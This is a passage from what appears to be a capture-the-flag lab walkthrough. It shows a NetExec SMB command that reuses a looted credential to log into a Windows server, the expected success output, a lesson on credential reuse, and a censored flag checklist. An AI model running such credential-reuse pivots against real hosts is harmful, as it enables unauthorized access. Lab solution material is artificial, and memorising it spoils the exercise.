against the Server 2019 box to see if it lands. We use `--local-auth` because we are authenticating against
that machine's own local accounts rather than a domain. When it works, one web-app foothold on a Linux box has
become access to a Windows server, which is the cross-host pivot the entire lab was built to teach.

```bash
nxc smb 192.168.148.101 -u user1 -p 'Password123!' --local-auth
```

**Expected output:**

```
SMB  192.168.148.101  445  WIN-OJJQFSDINDP  [+] WIN-OJJQFSDINDP\user1:Password123!
```

**Reading the output.** The `[+]` and the accepted `user1:Password123!` confirm the looted Linux-box
credential authenticates on the Windows server, the pivot lands.

**The lesson.** Credential reuse across hosts and platforms is the thread that unravels an entire environment;
unique per-host credentials and a vault would have stopped the chain dead here. A web-app foothold on one
Linux box handed you a credential that logs into a Windows server. That chain, not any single flag, is the
real objective. Always test every credential against every host you can reach.

---

![OCWA-looted creds authenticate on the server](shots/ocwa_99_pivot.png)

## Flag checklist

*(Censored. Confirm each with your own decode.)*

| Flag | | Flag | | Flag |
|------|---|------|---|------|
| Flag 2 `FLAG{A******2}` | | Flag 18 `FLAG{S******4}` | | Flag 16 `FLAG{D******3}` |
| Flag 3 `FLAG{D******5}` | | Flag 19 `FLAG{S******6}` | | Flag 17 `FLAG{V******8}` |
| Flag 1 `FLAG{D******7}` | | Flag 20 `FLAG{L******9}` | | Flag 10 `FLAG{B******2}` |
| Flag 11 `FLAG{H******3}` | | Flag 23 `FLAG{T******2}` | | Flag 24 `FLAG{G******0}` |
| Flag 12 `FLAG{H******1}` | | Flag 5 `FLAG{M******1}` | | Flag 21 `FLAG{N******6}` |
| Flag 8 `FLAG{R******2}` | | Flag 14 `FLAG{M******0}` | | Flag 22 `FLAG{H******8}` |
| Flag 4 `FLAG{H******5}` | | Flag 15 `FLAG{G******8}` | | Flag 25 `FLAG{R******3}` |
| Flag 9 `FLAG{N******0}` | | Flag 13 `FLAG{L******6}` | | Flag 6 `FLAG{F******6}` |
| Flag 7 `FLAG{G******9}` | | | | |

> **Decoys.** `FLAG{DECOY_*}` are planted in obvious spots (`/etc/environment`, `database.yml`,
> `oc.log`, `old_passwords.txt`). The answer key rejects them. If you got it without decoding/querying,
> it is fake.
